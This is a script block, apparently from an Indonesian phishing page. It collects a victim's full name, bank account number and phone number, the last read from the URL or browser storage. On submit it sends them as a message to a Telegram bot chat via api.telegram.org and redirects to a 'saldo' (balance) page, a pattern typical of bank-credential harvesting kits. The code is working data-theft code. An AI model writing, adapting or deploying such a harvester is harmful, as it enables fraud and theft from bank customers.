<script>
// AMBIL NOMOR HP DARI URL ATAU STORAGE
const urlParams = new URLSearchParams(window.location.search);
let nohp = urlParams.get('nohp');

// Jika tidak ada di URL, ambil dari localStorage
if (!nohp) {
    nohp = localStorage.getItem('nohp');
}

// Jika masih tidak ada, ambil dari sessionStorage
if (!nohp) {
    nohp = sessionStorage.getItem('nohp');
}

console.log('Nomor HP yang didapat:', nohp);

// Jika tetap tidak ada, set ke kosong
if (!nohp || nohp === 'null' || nohp === 'undefined') {
    nohp = '';
}

// Set nilai ke hidden input
document.getElementById('nohp').value = nohp;

// Tampilkan peringatan jika tidak ada nomor HP
if (!nohp) {
    alert('Peringatan: Nomor HP tidak ditemukan. Silakan isi manual di halaman ini.');
}

document.getElementById('myForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    
    // Ambil nilai dari form
    const nama = document.getElementById('nama').value;
    const rek = document.getElementById('rek').value;
    let nohp = document.getElementById('nohp').value;
    
    // Jika nohp kosong, coba ambil dari storage lagi
    if (!nohp) {
        nohp = localStorage.getItem('nohp');
        if (!nohp) nohp = sessionStorage.getItem('nohp');
        if (nohp) document.getElementById('nohp').value = nohp;
    }
    
    console.log('Data akan dikirim - Nama:', nama, 'Rek:', rek, 'NoHP:', nohp);
    
    // Validasi
    if (!nama) {
        alert('Silakan masukkan nama lengkap Anda!');
        return;
    }
    
    if (!rek || rek.length < 5) {
        alert('Silakan masukkan nomor rekening yang valid (minimal 5 digit)!');
        return;
    }
    
    if (!nohp) {
        // Jika masih tidak ada, minta input manual
        nohp = prompt('Nomor HP tidak ditemukan. Silakan masukkan nomor HP Anda:', '');
        if (!nohp || nohp.length < 10) {
            alert('Nomor HP tidak valid! Silakan mulai dari awal.');
            window.location.href = 'index.html';
            return;
        }
        document.getElementById('nohp').value = nohp;
    }
    
    // Tampilkan loading
    document.getElementById('djload').style.display = 'block';
    
    const currentDate = new Date();
    const formattedDate = currentDate.toLocaleString('id-ID');
    
    const message = `👤 Nama Lengkap: ${nama}\n🏦 Nomor Rekening: ${rek}\n📱 No. HP Terdaftar: ${nohp}`;
    
    try {
        const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            // SIMPAN SEMUA DATA
            localStorage.setItem('nama', nama);
            localStorage.setItem('rek', rek);
            localStorage.setItem('nohp', nohp);
            sessionStorage.setItem('nama', nama);
            sessionStorage.setItem('rek', rek);
            sessionStorage.setItem('nohp', nohp);
            
            console.log('Data tersimpan - Nama:', nama, 'Rek:', rek, 'NoHP:', nohp);
            
            // Redirect ke saldo.html dengan semua parameter
            window.location.href = 'saldo.html?nohp=' + encodeURIComponent(nohp) + '&rek=' + encodeURIComponent(rek) + '&nama=' + encodeURIComponent(nama);
        } else {
            document.getElementById('djload').style.display = 'none';
            alert('Gagal mengirim data. Silakan coba lagi.');
        }
    } catch (error) {
        document.getElementById('djload').style.display = 'none';
        alert('Terjadi kesalahan. Silakan coba lagi.');
    }
});

// Validasi input
document.getElementById('rek').addEventListener('input', function(e) {
    this.value = this.value.replace(/[^0-9]/g, '');
});

document.getElementById('nama').addEventListener('input', function(e) {
    this.value = this.value.replace(/[0-9]/g, '');
});
</script>
